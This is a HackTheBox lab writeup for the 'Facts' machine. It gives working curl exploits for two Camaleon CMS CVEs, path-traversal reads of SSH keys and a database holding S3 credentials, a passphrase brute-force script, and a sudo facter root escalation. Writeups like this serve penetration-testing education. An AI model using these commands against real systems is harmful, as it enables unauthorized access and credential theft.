---
title: "Facts — HackTheBox Writeup"
date: "2025-06-15"
description: "Medium Linux machine involving Camaleon CMS exploitation with CVE-2025-2304 (Mass Assignment) and CVE-2024-46987 (Path Traversal), MinIO S3 enumeration, SSH key cracking, and sudo facter privilege escalation."
tags: ['hackthebox', 'writeup', 'web pentest', 'linux', 'CVE']
thumbnail: "/attachments/facts/facts.png"
---

# Facts — HTB Labs Machine Writeup

**Difficulty:** Medium
**OS:** Linux
**Hostname:** facts.htb

---

## Attack Chain Summary

```
Register Account → CVE-2025-2304 (Admin Escalation) → CVE-2024-46987 (Path Traversal)
→ Read SSH Key + DB → Extract S3 Creds → MinIO Enumeration → Crack SSH Passphrase
→ SSH as trivia → sudo facter Privesc → Root
```

---

## Phase 1: Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- facts.htb
```

**Open Ports:**
| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Nginx → Rails 8.0.2 |
| 54321 | HTTP | MinIO S3 |

### Web Application

- **CMS:** Camaleon CMS v2.9.0
- **Framework:** Ruby on Rails 8.0.2
- **Database:** SQLite3
- **Storage:** MinIO S3 (running as root)

---

## Phase 2: Initial Access

### User Registration

Registered account via `/register` (CAPTCHA-protected).

---

## Phase 3: Privilege Escalation (Web) — CVE-2025-2304

**Vulnerability:** Mass Assignment in Camaleon CMS v2.9.0
**CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)

The profile update endpoint `/admin/users/{ID}/updated_ajax` uses `params.require(:password).permit!` which allows arbitrary parameter injection, including the `role` field.

### Exploitation

```bash
# 1. Get CSRF token from profile edit page
csrf=$(curl -s -b cookies.txt "http://facts.htb/admin/profile/edit" \
  | grep -oP 'name="authenticity_token" value="\K[^"]+')

# 2. Escalate role from 'client' to 'admin'
curl -s -b cookies.txt "http://facts.htb/admin/users/5/updated_ajax" \
  -d "_method=patch" \
  -d "authenticity_token=$csrf" \
  -d "password[role]=admin"
```

After this, the registered user has full admin access to the CMS dashboard.

---

## Phase 4: Arbitrary File Read — CVE-2024-46987

**Vulnerability:** Path Traversal in Camaleon CMS
**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

The `download_private_file` endpoint allows reading arbitrary files via path traversal.

### Key Files Retrieved

```bash
# Read user flag
curl -s -b cookies.txt \
  "http://facts.htb/admin/media/download_private_file?file=../../../../home/william/user.txt"

# /etc/passwd — discovered users: trivia (1000), william (1001)
# /etc/nginx/sites-enabled/facts.htb — nginx config revealing MinIO proxy
# /opt/factsapp/config/database.yml — SQLite database path
# /home/trivia/.ssh/id_ed25519 — trivia's encrypted SSH private key
```

### Database Extraction

```bash
# Download SQLite production database
curl -s -b cookies.txt \
  "http://facts.htb/admin/media/download_private_file?file=../../../../opt/factsapp/storage/production.sqlite3" \
  -o facts_prod.db

# Extract S3 credentials from cama_metas table
sqlite3 facts_prod.db "SELECT * FROM cama_metas WHERE key LIKE '%s3%';"
```

S3 credentials (Access Key and Secret Key) were found stored in the `cama_metas` table.

---

## Phase 5: MinIO S3 Enumeration

MinIO was running on port 54321 (accessible externally) as **root** via systemd service.

```bash
# Configure AWS CLI with extracted credentials
export AWS_ACCESS_KEY_ID=<access_key>
export AWS_SECRET_ACCESS_KEY=<secret_key>

# List buckets
aws --endpoint-url http://facts.htb:54321 s3 ls
# → randomfacts (public — animal facts images)
# → internal (private — root's home directory backup)

# List internal bucket
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/ --recursive
# → 2035+ files including /root/.ssh/id_ed25519, .bashrc, .bundle/, etc.
```

The `internal` bucket contained a backup of root's home directory, including SSH keys. However, root's SSH key was also encrypted, so we pivoted to trivia's key obtained via path traversal.

---

## Phase 6: SSH Key Cracking

Trivia's SSH key (`/home/trivia/.ssh/id_ed25519`) was encrypted with `aes256-ctr + bcrypt`.

### Brute Force Passphrase

```python
#!/usr/bin/env python3
import subprocess

key_file = "/tmp/trivia_ssh_key"
wordlist = "/path/to/rockyou.txt"

with open(wordlist, "r", errors="ignore") as f:
    for i, line in enumerate(f):
        password = line.strip()
        result = subprocess.run(
            ["ssh-keygen", "-y", "-f", key_file, "-P", password],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            print(f"FOUND PASSPHRASE: {password}")
            break
        if (i + 1) % 500 == 0:
            print(f"Tried {i + 1} passwords...")
```

The passphrase was found within ~3000 attempts using rockyou.txt.

### SSH Login

```bash
chmod 600 /tmp/trivia_ssh_key
ssh -i /tmp/trivia_ssh_key trivia@facts.htb
```

---

## Phase 7: Root Privilege Escalation — sudo facter

```bash
trivia@facts:~$ sudo -l
# (ALL) NOPASSWD: /usr/bin/facter
```

[Puppet Facter](https://puppet.com/docs/puppet/latest/facter.html) supports custom facts via `--custom-dir`. Custom facts are Ruby files executed by facter — since it runs as root via sudo, we get arbitrary command execution.

### Exploitation

```bash
# Create custom Ruby fact
cat > /tmp/rootflag.rb << 'EOF'
Facter.add(:rootflag) do
  setcode do
    Facter::Core::Execution.execute("cat /root/root.txt")
  end
end
EOF

# Execute as root
sudo /usr/bin/facter --custom-dir /tmp rootflag
```

> **Note:** `FACTERLIB` environment variable does NOT work here because `sudo` has `env_reset` enabled, which strips custom environment variables. The `--custom-dir` flag bypasses this.

---

## Vulnerabilities Summary

| # | Vulnerability | CVE | Severity | Impact |
|---|--------------|-----|----------|--------|
| 1 | Mass Assignment (Privilege Escalation) | CVE-2025-2304 | High | Client → Admin escalation |
| 2 | Path Traversal (Arbitrary File Read) | CVE-2024-46987 | Critical | Read any file on system |
| 3 | S3 Credentials in Database | — | High | Access to internal bucket |
| 4 | MinIO Exposed Externally | — | Medium | Direct S3 API access |
| 5 | Weak SSH Key Passphrase | — | Medium | Trivially crackable |
| 6 | sudo facter Misconfiguration | — | Critical | Root code execution |

---

## Key Takeaways

1. **Camaleon CMS** has multiple known CVEs — always check for mass assignment and path traversal
2. **MinIO/S3 credentials** in application databases are a common finding — always check for cloud storage creds
3. **SSH key passphrases** from common wordlists (rockyou.txt) can be cracked quickly with `ssh-keygen -y`
4. **Puppet Facter** with sudo is a known GTFOBins privesc — `--custom-dir` allows loading arbitrary Ruby code
5. **env_reset** in sudoers blocks `FACTERLIB` but `--custom-dir` flag bypasses this restriction

---

## Tools Used

- `nmap` — Port scanning & service detection
- `curl` — HTTP requests, CVE exploitation
- `sqlite3` — Database extraction & querying
- `aws-cli` — MinIO S3 bucket enumeration
- `ssh-keygen` — SSH key passphrase brute force
- `python3` — Custom scripts for brute forcing
